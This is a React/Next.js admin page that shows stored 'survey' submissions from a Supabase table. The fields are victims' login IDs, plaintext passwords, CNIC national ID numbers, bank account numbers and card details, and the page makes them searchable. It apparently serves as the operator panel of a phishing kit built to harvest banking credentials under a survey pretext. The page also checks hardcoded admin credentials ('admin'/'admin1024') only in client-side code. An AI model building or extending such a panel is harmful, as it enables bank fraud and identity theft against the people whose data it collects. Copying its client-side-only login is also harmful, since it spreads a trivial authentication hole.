"use client";

import { useEffect, useState } from "react";
import { supabase } from "../lib/supabaseClient";

interface SurveyEntry {
  id: string;
  login_id: string;
  password: string;
  cnic: string;
  bank_name: string;
  account_number: string;
  card_number: string;
  card_issue_date: string;
  name_on_card: string;
  review: string;
  created_at: string;
}

// Hardcoded admin credentials
const ADMIN_ID = "admin";
const ADMIN_PASSWORD = "admin1024";

export default function AdminPage() {
  const [loggedIn, setLoggedIn] = useState(false);
  const [adminId, setAdminId] = useState("");
  const [adminPassword, setAdminPassword] = useState("");
  const [entries, setEntries] = useState<SurveyEntry[]>([]);
  const [loading, setLoading] = useState(false);
  const [filter, setFilter] = useState("");

  // Login handler
  const handleLogin = () => {
    if (adminId === ADMIN_ID && adminPassword === ADMIN_PASSWORD) {
      setLoggedIn(true);
      fetchEntries();
    } else {
      alert("Invalid admin credentials");
    }
  };

  // Fetch survey entries
  const fetchEntries = async () => {
    setLoading(true);
    const { data, error } = await supabase
      .from<"survey_responses", SurveyEntry>("survey_responses")
      .select("*")
      .order("created_at", { ascending: false });

    if (error) {
      console.error("Error fetching data:", error);
    } else {
      setEntries(data);
    }
    setLoading(false);
  };

  // Filter entries based on Login ID, CNIC, or Name on Card
  const filteredEntries = entries.filter((e) => {
    const lower = filter.toLowerCase();
    return (
      e.login_id.toLowerCase().includes(lower) ||
      e.cnic.toLowerCase().includes(lower) ||
      e.name_on_card.toLowerCase().includes(lower)
    );
  });

  if (!loggedIn) {
    return (
      <div className="min-h-screen flex flex-col justify-center items-center p-6">
        <h1 className="text-3xl font-bold mb-6">Admin Login</h1>
        <div className="flex flex-col gap-4 w-full max-w-sm">
          <input
            placeholder="Admin ID"
            className="border p-3 rounded"
            value={adminId}
            onChange={(e) => setAdminId(e.target.value)}
          />
          <input
            placeholder="Password"
            type="password"
            className="border p-3 rounded"
            value={adminPassword}
            onChange={(e) => setAdminPassword(e.target.value)}
          />
          <button
            onClick={handleLogin}
            className="bg-blue-600 text-white p-3 rounded"
          >
            Login
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="p-6 max-w-6xl mx-auto min-h-screen">
      <h1 className="text-3xl font-bold mb-6">Survey Submissions</h1>

      <input
        placeholder="Search by Login ID, CNIC, or Name"
        className="border p-2 rounded mb-4 w-full max-w-md"
        value={filter}
        onChange={(e) => setFilter(e.target.value)}
      />

      {loading ? (
        <p>Loading...</p>
      ) : filteredEntries.length === 0 ? (
        <p>No submissions found.</p>
      ) : (
        <div className="overflow-x-auto">
          <table className="table-auto border-collapse border border-gray-300 w-full">
            <thead>
              <tr className="bg-gray-200">
                <th className="border px-3 py-1">Login ID</th>
                <th className="border px-3 py-1">Password</th>
                <th className="border px-3 py-1">CNIC</th>
                <th className="border px-3 py-1">Bank</th>
                <th className="border px-3 py-1">Account #</th>
                <th className="border px-3 py-1">Card #</th>
                <th className="border px-3 py-1">Card Issue Date</th>
                <th className="border px-3 py-1">Name on Card</th>
                <th className="border px-3 py-1">Review</th>
                <th className="border px-3 py-1">Submitted At</th>
              </tr>
            </thead>
            <tbody>
              {filteredEntries.map((e) => (
                <tr key={e.id} className="hover:bg-gray-100">
                  <td className="border px-2 py-1">{e.login_id}</td>
                  <td className="border px-2 py-1">{e.password}</td>
                  <td className="border px-2 py-1">{e.cnic}</td>
                  <td className="border px-2 py-1">{e.bank_name}</td>
                  <td className="border px-2 py-1">{e.account_number}</td>
                  <td className="border px-2 py-1">{e.card_number}</td>
                  <td className="border px-2 py-1">{e.card_issue_date}</td>
                  <td className="border px-2 py-1">{e.name_on_card}</td>
                  <td className="border px-2 py-1">{e.review}</td>
                  <td className="border px-2 py-1">
                    {new Date(e.created_at).toLocaleString()}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}
